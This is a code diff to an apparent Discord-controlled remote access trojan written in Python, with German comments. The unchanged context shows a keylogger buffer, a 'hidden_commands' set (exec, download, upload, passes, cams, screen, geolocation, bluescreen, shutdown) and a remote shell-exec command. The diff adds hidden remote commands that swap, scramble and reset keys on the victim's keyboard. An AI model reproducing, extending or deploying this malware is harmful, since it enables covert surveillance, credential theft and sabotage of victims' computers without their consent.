@@ -153,7 +153,7 @@ bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)
 # Buffer to store keylog data
 keylog_buffer = []
 
-hidden_commands = {"winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}  # Liste der versteckten Befehle
+hidden_commands = {"resetkb", "removekb", "checkkb", "switchkb", "winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}  # Liste der versteckten Befehle
 
 # Callback function for key press events
 def on_press(key):
@@ -2004,5 +2004,106 @@ async def exec(ctx, *, command):
             await ctx.send(f'Command failed with return code {result.returncode}')
     except Exception as e:
         await ctx.send(f'Error: {e}')
+
+#####################
+
+watching_enabled = False
+key_mapping = {}
+
+def watch_keyboard():
+    key_states = {key: False for key in key_mapping}
+    while True:
+        if watching_enabled:
+            for key in key_mapping:
+                if keyboard.is_pressed(key) and not key_states[key]:
+                    actions = key_mapping[key]
+                    for action in actions:
+                        time.sleep(0.0025)
+                        keyboard.send("\b")
+                        keyboard.send(action)
+                        time.sleep(0.001)
+                    key_states[key] = True
+                elif not keyboard.is_pressed(key):
+                    key_states[key] = False
+        time.sleep(0.001)
+
+def switch_keyboard(option):
+    global key_mapping
+    global watching_enabled
+    if len(option) == 3 and option[1] in ('>', '-'):
+        if option[1] == '>':
+            if option[0] in key_mapping:
+                key_mapping[option[0]].append(option[2])  # Füge eine weitere Zuordnung hinzu
+            else:
+                key_mapping[option[0]] = [option[2]]  # Ersetze das Mapping
+        elif option[1] == '-':
+            key_mapping[option[0]] = [option[2]]  # Ersetze das Mapping
+            key_mapping[option[2]] = [option[0]]  # Füge das umgekehrte Mapping hinzu
+        watching_enabled = True  # Aktiviere die Tastaturüberwachung
+        print(f"Tastaturüberwachung aktualisiert: {option}")
+    else:
+        print("Bitte gib ein gültiges Format ein, z.B. '>switchkb a>b' oder '>switchkb a-b'.")
+
+# Starte den Tastaturüberwachungsprozess
+watching_thread = threading.Thread(target=watch_keyboard)
+watching_thread.daemon = True
+watching_thread.start()
+
+# Befehl zum Ein- und Ausschalten der Tastaturüberwachung und Umschalten der Tasten
+@bot.command(help="switch keys on the keyboard (USAGE: >switchkb a-b (switches a to b and b to a), >switchkb a>b (switches a to b))")
+async def switchkb(ctx, option: str):
+    switch_keyboard(option)
+    if watching_enabled:
+        await ctx.send(f"Tastaturüberwachung aktualisiert: {option}")
+    else:
+        await ctx.send(f"Tastaturüberwachung aktiviert: {option}")
+
+# Befehl zum Überprüfen der vertauschten Tasten
+@bot.command(help="get all the switched keys")
+async def checkkb(ctx):
+    if key_mapping:
+        message = "Momentan vertauschte Tasten:\n"
+        for key, value in key_mapping.items():
+            message += f"{key} -> {value}\n"
+    else:
+        message = "Momentan sind keine Tasten vertauscht."
+    await ctx.send(message)
+
+@bot.command(help="remove a specific switched key (USAGE: >removekb a-b (remove ato b and b to a), >removekb a>b(remove a to b))")
+async def removekb(ctx, key: str):
+    global key_mapping
+    if key in key_mapping:
+        del key_mapping[key]
+        reverse_mapping = {value: key for key, value in key_mapping.items()}  # Erstelle ein umgekehrtes Mapping
+        if key in reverse_mapping:
+            del key_mapping[reverse_mapping[key]]  # Lösche das umgekehrte Mapping, falls vorhanden
+        await ctx.send(f"Tastaturzuordnung für Taste '{key}' wurde entfernt.")
+    elif '>' in key or '-' in key:
+        if '>' in key:
+            key = key.split('>')
+            key_mapping.pop(key[0], None)  # Entferne das Mapping ä->ü
+        elif '-' in key:
+            key = key.split('-')
+            key_mapping.pop(key[0], None)  # Entferne das Mapping ä-ü
+            key_mapping.pop(key[1], None)  # Entferne das Mapping ü-ä
+        await ctx.send(f"Tastaturzuordnung für Taste '{key}' wurde entfernt.")
+    else:
+        await ctx.send(f"Tastaturzuordnung für Taste '{key}' existiert nicht.")
+
+@bot.command(help="reset the switched keys")
+async def resetkb(ctx):
+    global key_mapping
+    key_mapping = {}
+    await ctx.send("Alle Tastaturzuordnungen wurden zurückgesetzt.")
+
+@bot.command(help="Reset and assign random keys to each letter of the alphabet")
+async def randomkb(ctx):
+    await resetkb(ctx)  # Alle vorherigen Tastenzuordnungen zurücksetzen
+    all_keys = list("abcdefghijklmnopqrstuvwxyz") * 2  # Verdoppeln Sie die Tasten, um sowohl linke als auch rechte Tasten zu haben
+    random.shuffle(all_keys)  # Die Tasten zufällig mischen
+    for i in range(0, len(all_keys), 2):  # Iterieren Sie über jedes Paar von Tasten
+        key_mapping[all_keys[i]] = all_keys[i + 1]  # Ordnen Sie die linke Taste der rechten Taste zu
+        key_mapping[all_keys[i + 1]] = all_keys[i]  # Ordnen Sie die rechte Taste der linken Taste zu
+    await ctx.send("Alle Tasten wurden zufällig zugewiesen.")
 
 bot.run(TOKEN)
